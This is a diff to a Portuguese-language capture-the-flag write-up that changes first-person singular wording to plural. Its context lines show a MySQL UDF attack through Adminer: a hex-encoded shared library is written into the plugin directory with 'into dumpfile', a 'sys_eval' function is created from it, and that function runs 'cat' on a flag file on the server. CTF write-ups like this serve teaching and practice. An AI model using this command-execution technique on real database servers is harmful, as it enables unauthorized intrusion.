@@ -94,12 +94,12 @@ E rodando o SQL lá no Adminer:
 
 `select unhex('7f454c4601010100000000000000000...') into dumpfile '/usr/lib/mysql/plugin/sigsegv.so' from dual`
 
-Percebi que a query foi executada com sucesso! Agora então só bastava criar uma UDF que executasse comando no servidor
-e retornasse o output. Então escolhi a `sys_eval` da lib, e criei executando:
+Percebemos que a query foi executada com sucesso! Agora então só bastava criar uma UDF que executasse comando no servidor
+que retornasse o output. Então escolhemos a `sys_eval` da lib, e criamos executando:
 
 `CREATE FUNCTION sys_eval RETURNS string SONAME 'sigsegv.so';`
 
-Tornou possível verificar os arquivos no servidor, o que logo me levou a:
+Tornando possível verificar os arquivos no servidor (`ls`), o que logo nos levou a:
 
 `select sys_eval('cat /home/Th3_D@rk_S3cr3t/FL@g_Bala7.txt') from dual`
 
